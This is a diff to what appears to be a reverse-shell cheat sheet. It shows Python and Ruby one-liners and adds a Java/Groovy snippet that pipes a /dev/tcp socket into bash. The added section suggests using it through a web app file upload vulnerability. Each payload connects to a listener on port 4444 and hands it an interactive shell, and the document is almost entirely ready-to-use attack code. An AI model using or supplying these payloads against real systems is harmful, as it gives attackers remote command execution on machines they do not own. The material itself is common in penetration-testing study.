@@ -30,4 +30,11 @@ Good ol' PERL, nearly every system has it and is a cornerstone of utility -
         python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 ### 5. Ruby
-	ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+	ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'   
+
+### 6. Java
+
+This is a pretty obscure / esoteric method but there might be a chance you might come across using this  (probably during a web app file upload vuln ? )
+	r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
